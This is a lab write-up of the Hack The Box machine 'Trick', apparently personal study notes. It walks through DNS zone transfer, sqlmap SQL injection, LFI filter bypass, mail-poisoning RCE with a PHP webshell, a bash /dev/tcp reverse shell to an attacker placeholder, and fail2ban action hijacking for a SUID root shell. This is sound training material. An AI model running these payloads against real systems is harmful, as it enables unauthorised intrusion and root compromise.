---
tags: [htb, linux, easy, writeup]
cve: CVE-2022-28468
techniques: [zone-transfer, sqli, lfi, mail-poisoning, fail2ban, suid]
---
# Trick (HTB)

| Field              | Value           |
| ------------------ | --------------- |
| OS                 | Linux           |
| Difficulty         | Easy            |
| Box IP             | `10.129.2.82`   |
| Attacker IP (tun0) | `<attacker-ip>` |

> [!info] Kill Chain
> [[Zone Transfer]] → vHost → [[SQL Injection|SQLi]] (file read) → nginx config → 2nd vHost with [[Local File Inclusion|LFI]] → [[Mail and Log Poisoning]] (RCE) → [[fail2ban Abuse]] → [[SUID Abuse|SUID]] → **root**

---

# 1 · Enumeration

## Zone Transfer → [[Zone Transfer]]
- `nmap -sCV 10.129.2.82` → `53/tcp open domain` => zone transfer tested
```bash
dig axfr trick.htb @10.129.2.82
# => preprod-payroll.trick.htb   (first vHost)
```
- Zone transfer (`axfr`) = request for all records of a DNS zone. Actually only intended between DNS servers → retrievable by anyone if misconfigured. This reveals hidden subdomains/vHosts
- Added to `/etc/hosts` for DNS resolution
	- needed because the local machine otherwise cannot resolve `trick.htb`. `/etc/hosts` = local "name → IP" mapping that takes precedence over DNS
```bash
sudo nano /etc/hosts
# 10.129.2.82  trick.htb preprod-payroll.trick.htb
curl http://preprod-payroll.trick.htb | grep -i title
# => Payroll Management System
```

---

# 2 · Foothold

## 2.1 SQLi → [[SQL Injection]]
- Login request intercepted (DevTools → *Copy Request Headers*)
- body added (`username=jn&password=na`)
- saved as `trick_req.txt`:
```http
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=alksf2i0267tg0rg4rbn76usc5

username=jn&password=na
```
```bash
sqlmap -r trick_req.txt --batch --dbs
# => username vulnerable (time-based blind, MariaDB)
# => DBs: information_schema, payroll_db
```
- the complete request is saved as a file and handed to `sqlmap` via `-r` → headers and cookie don't need to be specified individually. `--batch` = sqlmap uses the default answers without asking
- "time-based blind" = the application returns no visible errors, the evaluation is done via the **response time** (e.g. `SLEEP(5)` → 5 s delay = condition true). Slow, but reliable

## 2.2 FILE privilege → nginx config
```bash
sqlmap -r trick_req.txt --batch --is-dba --privileges   # => FILE ✅
sqlmap -r trick_req.txt --batch --threads=10 \
  --file-read=/etc/nginx/sites-enabled/default
```
- the `FILE` privilege = the database may read files from the server → via the SQLi not only DB contents but also **system files** can be read
- the nginx config is relevant because it contains all vHosts served by the web server – including ones without a DNS record
The config contains 3 `server_name` entries → new vHost:

| server_name                   | root               |
| ----------------------------- | ------------------ |
| `trick.htb`                   | `/var/www/html`    |
| `preprod-payroll.trick.htb`   | `/var/www/payroll` |
| `preprod-marketing.trick.htb` | `/var/www/market`  |

=> `preprod-marketing.trick.htb` added to `/etc/hosts`.

> [!note] DNS ≠ nginx
> A zone transfer only shows what the **DNS** knows. `preprod-marketing` has no DNS record → discoverable only via the nginx config. This is usually used for internal web server communication

## 2.3 LFI → [[Local File Inclusion]]
`?page=` loads files → `/etc/passwd` read:
```bash
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd" | grep 1001
# michael:x:1001:1001::/home/michael:/bin/bash
```
=> user with UID 1001 = **`michael`** (`....//` = nested traversal against the filter)
- `?page=` includes a file into the page. If a path like `../../etc/passwd` is passed instead of a page name, foreign files can be read = LFI
- `....//` instead of `../`: the application strips `../`. If it removes the middle sequence from `....//`, `../` remains again → filter bypassed

## 2.4 LFI → [[Mail and Log Poisoning]] -> RCE
**(1)** PHP payload injected via mail (SMTP 25):
```bash
printf 'HELO trick.htb\nMAIL FROM:<a@trick.htb>\nRCPT TO:<michael@localhost>\nDATA\nSubject: pwn\n\n<?php system($_GET["cmd"]); ?>\n.\nQUIT\n' | nc 10.129.2.82 25
```
> [!warning] `454 Relay access denied`
> Only `michael@localhost` / `@debian.localdomain` accepted, not `@trick.htb`.

- same principle as on Reset, just via mail instead of a log: a mail with PHP code in its body is sent to michael and stored in `/var/mail/michael`
- then the mail file is included via LFI → PHP executes the code. `nc ... 25` = direct communication with the SMTP server, the mail is handed over line by line

**(2)** Mail included via LFI + command:
```bash
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&cmd=id"
# uid=1001(michael) ... groups=1001(michael),1002(security)   <- security group (relevant later)
```

## 2.5 User flag
```bash
curl -G "http://preprod-marketing.trick.htb/index.php" \
  --data-urlencode "page=....//....//....//....//....//var/mail/michael" \
  --data-urlencode "cmd=cat /home/michael/user.txt"
# => 32 hex
```

---

# 3 · Privilege Escalation → [[fail2ban Abuse]]

## 3.1 User's sudo rights
```bash
# ...&cmd=sudo%20-l
(root) NOPASSWD: /etc/init.d/fail2ban restart
```
=> flaw = `security` group + passwordless fail2ban restart.
- principle: fail2ban runs as **root** and, on a ban, executes an "action" file. With write access to this file (via the `security` group) and the passwordless restart (NOPASSWD), an own command can be injected that runs as root

## 3.2 Reverse shell → [[Reverse Shell]]
```bash
# Terminal 1
nc -lvnp 4444
# Terminal 2
curl -G "http://preprod-marketing.trick.htb/index.php" \
  --data-urlencode "page=....//....//....//....//....//var/mail/michael" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
```
Shell upgrade: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm`
- reason for the reverse shell: via the `cmd=` curl, interactive work is barely possible (creating files, `cd`, tab completion). A real shell makes the next steps much easier
- the upgrade turns the limited shell into a full one (arrow keys, `Ctrl+C` no longer kills the entire shell, etc.)

## 3.3 Action file hijack → [[fail2ban Abuse]] (with [[SUID Abuse]])
```bash
ls -la /etc/fail2ban/action.d/
# drwxrwx--- root security   <- michael (security) may write in the folder
```
- `drwxrwx---` + group `security`: write access to the **directory** (create/rename files), but the existing file belongs to root → directly overwriting it is not possible
- therefore: the old file is renamed (directory operation, allowed) and a new one with the same name created (also allowed) → the own version is active
```bash
cd /etc/fail2ban/action.d/
mv iptables-multiport.conf iptables-multiport.conf.bak   # rename (file permission missing)
cat > iptables-multiport.conf << 'EOF'
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
actionunban =
EOF
sudo /etc/init.d/fail2ban restart
```
- `actionban` = the command fail2ban runs (as root) on a ban. Entered here: copy bash to `/tmp` and set the SUID bit
- SUID (`4755`): whoever runs the file runs with the **owner's** permissions (here root), not their own → the copy becomes a root shell
- `restart` reloads the manipulated action file
> [!danger] `chmod +s` is NOT enough
> `+s` → `-rws--S---` (no `x` for group/others) → `Permission denied`.
> `chmod 4755` → `-rwsr-xr-x` → executable.

## 3.4 Ban trigger + root
```bash
# from Kali: failed SSH logins => ban
for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@10.129.2.82; done
```
- the ban must fire for `actionban` to run: fail2ban blocks after several failed SSH logins → wrong logins generated on purpose
- the ban is triggered → `actionban` runs as root → `/tmp/rootbash` is created with SUID. `-p` on start prevents the root privileges from being dropped immediately
```bash
ls -la /tmp/rootbash        # -rwsr-xr-x root root
/tmp/rootbash -p            # -p = keep root privileges
id                          # euid=0(root) ✅
cat /root/root.txt          # => 32 hex
```
